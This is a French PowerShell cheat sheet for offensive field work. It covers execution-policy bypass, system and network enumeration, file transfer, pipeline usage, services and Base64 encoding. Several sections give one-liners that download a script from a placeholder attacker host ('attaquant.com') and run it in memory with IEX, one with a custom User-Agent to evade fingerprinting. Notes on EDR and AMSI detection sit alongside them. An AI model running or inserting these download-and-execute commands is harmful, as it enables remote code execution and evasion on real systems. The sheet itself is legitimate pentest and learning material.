# PowerShell Basics — fiche de triche terrain

---

## 1. Contournement d'Execution Policy

```powershell
powershell -ep bypass                        # Lance une session avec la policy contournée pour cette instance
powershell -ExecutionPolicy Bypass -File script.ps1   # Exécute un script précis en bypass
powershell -nop -ep bypass -c "Get-Process"   # -nop (NoProfile) : n'exécute pas le profil utilisateur
```

```powershell
Get-ExecutionPolicy -List                    # Liste la policy appliquée à chaque scope (Process, User, Machine)
Set-ExecutionPolicy Bypass -Scope Process     # Change la policy uniquement pour le processus courant
```

```powershell
Unblock-File -Path .\script.ps1               # Retire le flag "Zone.Identifier" (fichier téléchargé)
```

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attaquant.com/script.ps1')
# Exécute un script en mémoire, sans écriture sur disque, contournant toute policy locale
```

!!! warning "Execution Policy ≠ contrôle de sécurité"
    L'Execution Policy est une protection contre les erreurs accidentelles, pas un mécanisme de sécurité au sens strict. Elle se contourne trivialement par `-ep bypass`, l'exécution en mémoire, ou en collant directement le code dans une console interactive.

---

## 2. Énumération système & réseau

```powershell
Get-ComputerInfo                              # Informations complètes : OS, BIOS, domaine, hotfix
Get-ComputerInfo | Select OsName, OsVersion, CsDomain   # Filtre les champs pertinents
```

```powershell
Get-LocalUser                                 # Liste les comptes utilisateurs locaux
Get-LocalGroupMember -Group "Administrators"  # Liste les membres du groupe Administrateurs local
Get-LocalGroupMember -Group "Remote Desktop Users"  # Idem pour un autre groupe local
```

```powershell
Get-NetIPAddress                              # Liste les adresses IP configurées sur les interfaces
Get-NetIPAddress -AddressFamily IPv4          # Filtre uniquement les adresses IPv4
Get-NetTCPConnection                          # Équivalent moderne de netstat, connexions TCP actives
Get-NetTCPConnection -State Listen            # Filtre uniquement les ports en écoute
```

!!! tip "Objets, pas texte"
    Contrairement à `netstat` ou `ipconfig`, ces cmdlets renvoient de véritables objets .NET manipulables par le pipeline (`Where-Object`, `Sort-Object`...), pas de simples chaînes à parser.

---

## 3. Transfert de fichiers & requêtes web

```powershell
Invoke-WebRequest -Uri http://cible.com/fichier.exe -OutFile fichier.exe   # Télécharge un fichier
Invoke-WebRequest -Uri http://cible.com/api -Method Post -Body $data       # Requête POST avec corps
iwr http://cible.com -UseBasicParsing                                     # Alias court, sans moteur IE
```

```powershell
(New-Object Net.WebClient).DownloadFile('http://cible.com/fichier.exe', 'C:\Temp\fichier.exe')
# Télécharge un fichier vers le disque via l'ancienne classe WebClient

(New-Object Net.WebClient).DownloadString('http://cible.com/script.ps1')
# Récupère le contenu d'un script distant sous forme de chaîne, sans écrire sur disque
```

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://cible.com/script.ps1')
# Exécute directement le script téléchargé, sans jamais toucher le disque

Invoke-Expression (Invoke-WebRequest -Uri http://cible.com/script.ps1 -UseBasicParsing).Content
# Équivalent utilisant Invoke-WebRequest plutôt que WebClient
```

!!! warning "IEX largement surveillé"
    `Invoke-Expression` (`IEX`) combiné à un téléchargement distant est une signature classique détectée par la quasi-totalité des EDR modernes et des règles AMSI/Sysmon (Event ID 4104 en particulier).

---

## 4. Manipulation d'objets & pipeline

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 }        # Filtre les objets selon une condition
Get-Process | Where-Object CPU -gt 100                # Syntaxe simplifiée (PowerShell 3.0+)
```

```powershell
Get-Process | Select-Object Name, CPU, Id             # Sélectionne uniquement certaines propriétés
Get-Process | Select-Object -First 5                  # Limite aux 5 premiers résultats
Get-Process | Select-Object -Unique Name               # Élimine les doublons sur une propriété
```

```powershell
Get-Process | Sort-Object CPU -Descending              # Trie par propriété, ordre décroissant
Get-Service | Sort-Object Status, Name                 # Tri multi-critères
```

```powershell
Get-Process | Format-List *                            # Affiche toutes les propriétés en liste verticale
Get-Process | Format-Table Name, Id -AutoSize           # Affiche en tableau, colonnes ajustées
```

```powershell
Get-Process | Measure-Object -Property CPU -Sum -Average -Maximum
# Calcule des statistiques (somme, moyenne, max) sur une propriété numérique
```

!!! tip "Chaînage typique"
    L'enchaînement `Get-X | Where-Object {...} | Select-Object ... | Sort-Object ...` constitue le squelette standard de la quasi-totalité des one-liners d'analyse PowerShell.

---

## 5. Gestion des processus & services

```powershell
Get-Process                                   # Liste tous les processus actifs
Get-Process -Name "chrome"                    # Filtre par nom de processus
Stop-Process -Name "chrome" -Force             # Termine tous les processus correspondant au nom
Stop-Process -Id 1234 -Force                   # Termine un processus par son PID
```

```powershell
Get-Service                                   # Liste tous les services et leur état
Get-Service -Name "wuauserv"                   # Détail d'un service précis
Start-Service -Name "wuauserv"                 # Démarre un service
Stop-Service -Name "wuauserv" -Force            # Arrête un service
```

```powershell
Get-WmiObject -Class Win32_Service             # Liste les services via WMI (chemin binaire inclus)
Get-CimInstance -ClassName Win32_Service        # Équivalent moderne recommandé (CIM remplace WMI)
Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq "Auto" }   # Filtre les services en auto
```

!!! warning "WMI vs CIM"
    `Get-WmiObject` est déprécié depuis PowerShell 5.1 et absent de PowerShell 7+. `Get-CimInstance` doit être préféré pour tout script destiné à rester compatible sur le long terme.

---

## 6. Encodage & one-liners utiles

### Base64

```powershell
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Get-Process"))
# Encode une commande en Base64 (encodage UTF-16LE, requis pour -EncodedCommand)

$texte = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("R2V0LVByb2Nlc3M="))
# Décode une chaîne Base64 en texte lisible
```

```powershell
powershell -EncodedCommand <chaine_base64>
# Exécute directement une commande PowerShell encodée en Base64 (courant en post-exploitation)
```

### Exécution de scripts distants sans toucher le disque

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attaquant.com/script.ps1')
# Récupère et exécute un script entièrement en mémoire, aucune trace disque

$wc = New-Object Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0")
IEX $wc.DownloadString('http://attaquant.com/script.ps1')
# Variante avec User-Agent personnalisé pour limiter le fingerprinting
```

!!! warning "Journalisation PowerShell moderne"
    Depuis PowerShell 5+, le Script Block Logging et l'AMSI capturent le contenu réellement exécuté en mémoire, y compris via `IEX` — l'absence d'écriture disque ne garantit plus l'absence de trace côté EDR/SIEM.
